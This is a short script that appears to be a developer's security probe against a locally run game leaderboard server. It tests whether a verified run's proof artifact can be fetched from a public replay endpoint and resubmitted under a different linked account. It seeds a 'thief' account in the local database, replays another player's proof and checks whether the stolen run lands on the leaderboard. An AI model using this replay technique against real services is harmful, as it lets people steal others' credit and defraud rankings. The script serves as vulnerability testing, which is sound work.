// PROBE: does a proof bind to the account that PLAYED it?
// Fetches a verified all-time row's artifact through the public WATCH/RACE
// endpoint and submits it under a different linked account.
import Database from "better-sqlite3";

const API = "http://localhost:5451";
const DB = "tools/_c5.sqlite";
const THIEF = "THIEF-TOKEN-000000AB";
const VICTIM_RUN = process.argv[2] ?? "seed-13"; // Odette Vance, verified floor-18 clear

// Any player with Discord linked has this. Simulate the link the honest way.
const db = new Database(DB);
const now = Date.now();
db.prepare("INSERT OR IGNORE INTO accounts (id,name,created_at,last_seen_at) VALUES (?,?,?,?)")
  .run(THIEF, "Thief", now, now);
db.prepare("INSERT OR REPLACE INTO account_identities (provider,provider_id,account_id,display,created_at) VALUES (?,?,?,?,?)")
  .run("discord", "999000111", THIEF, "Thief#0001", now);
db.close();

const meta = await (await fetch(`${API}/runs/${VICTIM_RUN}`)).json();
console.log("VICTIM ROW:", JSON.stringify({
  name: meta.name, state: meta.state, floor: meta.floor, won: meta.won,
  timeSec: meta.timeSec, kills: meta.kills, publicId: meta.publicId,
}));

// 1. The artifact, from the endpoint the WATCH / RACE buttons already use.
const r = await fetch(`${API}/runs/${VICTIM_RUN}?proof=1`, { headers: { "accept-encoding": "identity" } });
console.log("PROOF FETCH:", r.status, "playable=" + r.headers.get("x-dcc-playable"), "era=" + r.headers.get("x-dcc-rules-hash"));
const bytes = Buffer.from(await r.arrayBuffer());
console.log("artifact bytes:", bytes.length);

// 2. Submit it as somebody else.
const post = await fetch(`${API}/runs?token=${THIEF}&name=THIEF`, {
  method: "POST", headers: { "content-type": "application/octet-stream" }, body: bytes,
});
const out = await post.json();
console.log("SUBMIT:", post.status, JSON.stringify(out));

if (out.runId) {
  for (let i = 0; i < 60; i++) {
    await new Promise((s) => setTimeout(s, 2000));
    const row = await (await fetch(`${API}/runs/${out.runId}`)).json();
    if (row.state !== "verifying" && row.state !== "claimed") {
      console.log("FINAL:", JSON.stringify({ name: row.name, state: row.state, floor: row.floor, won: row.won, timeSec: row.timeSec, kills: row.kills, reason: row.reason, publicId: row.publicId }));
      break;
    }
    if (i % 5 === 0) console.log("  ...", row.state, row.reason ?? "");
    if (i === 59) console.log("STILL", JSON.stringify(row).slice(0, 300));
  }
  const b = await (await fetch(`${API}/boards/deepest`)).json();
  console.log("DEEPEST TOP 5:", b.entries.slice(0, 5).map((e) => `${e.name} ${e.state} f${e.floor} ${e.timeSec}s ${e.kills}k`).join(" | "));
  const cr = await (await fetch(`${API}/crawler/${(await (await fetch(`${API}/runs/${out.runId}`)).json()).publicId}`)).json().catch(() => null);
  console.log("THIEF CAREER:", JSON.stringify(cr).slice(0, 400));
}
